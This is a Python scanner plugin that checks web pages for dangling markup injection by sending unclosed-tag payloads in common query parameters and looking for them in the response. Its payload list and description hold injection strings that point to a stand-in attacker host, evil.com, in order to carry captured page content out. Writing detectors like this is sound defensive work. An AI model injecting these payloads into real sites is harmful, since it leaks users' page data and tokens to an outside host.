"""
Plugin 1237: Dangling Markup Injection Detection
=================================================
Detects dangling markup injection vulnerabilities where an attacker can inject
an unclosed HTML tag to capture subsequent page content.
"""
import asyncio
import ssl

from plugins import NaslPlugin, PluginResult


class DanglingMarkupDetection(NaslPlugin):
    PLUGIN_ID = 1237
    NAME = 'Dangling Markup Injection Detection'
    FAMILY = 'Web Applications'
    CVSS_SCORE = 6.1
    DESCRIPTION = (
        'Detects dangling markup injection vulnerabilities where an attacker can '
        'inject an unclosed HTML tag (like <img src="http://evil.com/steal?data=) '
        'causing subsequent page content to be captured as an attribute value and '
        'sent to the attacker as part of the img tag URL.'
    )
    SOLUTION = (
        'Use proper output encoding. Set Content-Security-Policy with img-src '
        'restrictions. Validate and sanitize all reflected input. Use '
        'X-Content-Type-Options: nosniff.'
    )
    CVE = []
    PORTS = [80, 443, 8080, 8443]

    DANGLING_PAYLOADS = [
        '<img src="//evil.com/leak?',
        '<form action="//evil.com/steal',
        '<link rel="stylesheet" href="//evil.com/',
        '<iframe src="//evil.com/',
        '<script src="//evil.com/',
    ]

    INJECTION_PARAMS = ['q', 'search', 'query', 's', 'text', 'input', 'page', 'id', 'name', 'url']

    async def check_target(self, target: str, port: int | None = None) -> list[PluginResult]:
        results = []
        for port_to_check in (self.PORTS if port is None else [port]):
            try:
                scheme = 'https' if port_to_check in (443, 8443) else 'http'
                ctx = None
                if scheme == 'https':
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                host_header = 'alieninc.tech' if target in ('127.0.0.1', 'localhost', '::1') else target
                for payload in self.DANGLING_PAYLOADS:
                    for param in self.INJECTION_PARAMS:
                        try:
                            reader, writer = await asyncio.wait_for(
                                asyncio.open_connection(target, port_to_check, ssl=ctx), timeout=5
                            )
                            encoded = payload.replace(' ', '%20').replace('"', '%22').replace('<', '%3C').replace('>', '%3E')
                            req = (
                                f'GET /?{param}={encoded} HTTP/1.1\r\n'
                                f'Host: {host_header}\r\n'
                                f'User-Agent: Centra/1.0\r\n'
                                f'Connection: close\r\n\r\n'
                            )
                            writer.write(req.encode())
                            await writer.drain()
                            response = b''
                            try:
                                while True:
                                    chunk = await asyncio.wait_for(reader.read(4096), timeout=3)
                                    if not chunk:
                                        break
                                    response += chunk
                                    if len(response) > 8192:
                                        break
                            except asyncio.TimeoutError:
                                pass
                            writer.close()
                            await writer.wait_closed()
                            body = response.split(b'\r\n\r\n', 1)
                            if len(body) > 1:
                                text = body[1].decode('utf-8', errors='ignore')
                                seek = payload.split('"')[0] if '"' in payload else payload.split("'")[0] if "'" in payload else payload
                                if seek in text:
                                    results.append(PluginResult(
                                        vulnerable=True,
                                        target=target,
                                        port=port_to_check,
                                        cvss_score=self.CVSS_SCORE,
                                        severity='medium',
                                        description=(
                                            f'Dangling markup injection detected via param "{param}" '
                                            f'- payload "{payload}" reflected in response'
                                        ),
                                        solution=self.SOLUTION,
                                        evidence=f'Injected payload: {payload} found in response',
                                        references=[
                                            'https://portswigger.net/web-security/dangling-markup',
                                            'https://owasp.org/www-community/attacks/Dangling_Markup',
                                        ]
                                    ))
                                    break
                        except (asyncio.TimeoutError, ConnectionRefusedError, OSError, ssl.SSLError):
                            pass
                    if results:
                        break
            except (asyncio.TimeoutError, ConnectionRefusedError, OSError, ssl.SSLError):
                pass
        if not results:
            results.append(PluginResult(
                vulnerable=False, target=target, port=port or 0,
                description='No dangling markup injection indicators detected'
            ))
        return results
